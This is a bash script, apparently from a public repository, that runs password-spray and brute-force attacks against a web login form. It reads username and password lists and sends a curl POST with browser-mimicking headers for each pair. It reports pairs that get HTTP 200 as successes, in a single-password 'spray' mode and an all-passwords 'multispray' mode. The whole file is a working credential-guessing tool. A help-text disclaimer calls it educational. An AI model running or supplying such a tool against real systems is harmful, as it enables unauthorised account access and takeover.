#!/bin/bash
#This must be run with bash. Not ZSH or others. We rely on tools such as mapFile.
#=============================================

# Banner and Help

#=============================================


/bin/echo -e "\n[+]================================[+]"
/bin/echo "[+]Basic POST Login Form Bruteforce Tool[+]"
/bin/echo "[+]Author Repo: https://github.com/dc-333-666/login_brute_tool/ [+]"
/bin/echo "[+]================================[+]"
/bin/sleep 1


show_help() {
  cat <<'EOF'
Basic POST Login Form Bruteforce Tool
A bash script demonstrating a basic bruteforce against a target endpoint login form.

More information:

Usage:
  /bin/bash login_brute_tool.sh <target_host/ip> <target_port> <username_list_file_path> <password_list_file_path> <attack_mode>


Example:
  /bin/bash login_brute_tool.sh 127.0.0.1 80 users.txt passwords.txt multispray


Attack Modes:
- spray -> all usernames in the list, first password in the list
- multispray -> all usernames, all passwords;tests each password iteratively with every username

Notes:
- Adjustable header parameters are found within the send_post_req_login function. You can add cookies with -b appended to the curl command syntax.
- Only currently has two supported modes: spray, and multispray.
- Will add further support in the future for different password attack methods.
- Please use responsibly only against devices you have permission to do. This is for educational purposes only.
EOF
}

# Help params
if [[ "$1" == "--help" || "$1" == "-h" ]]; then
  show_help
  exit 0
fi

#Define the target
target_host="$1"
target_port="$2"

#Map the User/Pass list files
user_list_file="$3"
pw_list_file="$4"

mapfile -t username_list < "$user_list_file"
mapfile -t password_list < "$pw_list_file"


#Now we define our mode of attack
attack_mode="${5:-"spray"}"
if [[ "$5" == "spray" ]]; then
        attack_mode="spray"
elif [[ "$5" == "multispray" ]]; then
        attack_mode="multispray"
else
        echo "[x] Unknown attack mode - Exiting without running [x]"
fi

#This is our base url, we should adjust this in the future to be more modular and understandable
base_url="http://$target_host:$target_port/login"

request_total_counter=0

increase_request_count() {
        ((request_total_counter++))
}

reset_request_count() {
        /bin/echo "[+]Resetting POST Request Count - $request_total_counter [+]"
        ((request_total_counter=0))
        /bin/echo "[+]POST Request Count Reset - $request_total_counter [+]"
}


send_post_req_login() {
        local user="$1"
        local password="$2"
        local pl_login="{\"username\":\"$user\",\"password\":\"$password\"}"
        #local header_content_length=$(/bin/echo -n "$pl_login" | wc -c)
        local headers=(
        -H "Host: $target_host"
        #-H "Content-Length: $header_content_length"
        -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/142.0.0.0 Safari/537.36 Edg/142.0.0.0"
        -H "Accept: application/json, text/plain, */*"
        -H "DNT: 1"
        -H "Content-Type: application/json"
        -H "Origin: http://$target_host"
        -H "Referer: http://$target_host/"
        -H "Accept-Encoding: gzip, deflate, br"
        -H "Accept-Language: en-US,en;q=0.9"
        -H "Connection: keep-alive"
        )
        local curl_cmd_post=(/bin/curl -s -o /dev/null -w "%{http_code}" -X POST "${headers[@]}" --data-binary "$pl_login" "$base_url")
        /bin/echo "[+]Sending POST Request - [$request_total_counter] [+]" >&2
        local attempt=$(/bin/timeout 10s "${curl_cmd_post[@]}")
        local status=$?
        increase_request_count
        if [[ $status -eq 124 ]]; then
                /bin/echo "[x] Request timed out! [x]"
        else
                if [[ "$attempt" -eq 200 ]]; then
                        /bin/echo "SUCCESS: $user<<sep>>$password"
                else
                        /bin/echo "FAIL: $user<<sep>>$password" >&2
                fi
                /bin/echo "[+]Sent POST Request - [$request_total_counter] [+]" >&2
        fi
        return 0
}


send_post_spray() {
/bin/echo -e "\n" >&2
/bin/echo "[*] Password spray started [*]"
        local delay="${1:-0}"
        local pl_pos2="${2:-${password_list[0]}}"
        local u=0
        while (( $u < ${#username_list[@]} )); do
                local pl_pos1=${username_list[$u]}
                send_post_req_login "$pl_pos1" "$pl_pos2"
                ((u++))
                /bin/sleep "$delay"
        done
/bin/echo -e "\n" >&2
/bin/echo "[*] Password spray completed [*]"
}

send_post_spray_multi() {
/bin/echo "[*] Multi-Password spray started [*]"
        local delay="${1:-0}"
        for pw in "${password_list[@]}"
        do
                send_post_spray "$delay" "$pw"
        done
/bin/echo "[*] Multi-Password spray completed [*]"
}

case $attack_mode in
        spray)
                send_post_spray
        ;;

        multispray)
                send_post_spray_multi
        ;;

        *)
                echo "Unknown attack mode given to switch - Exiting without running"
        ;;
esac
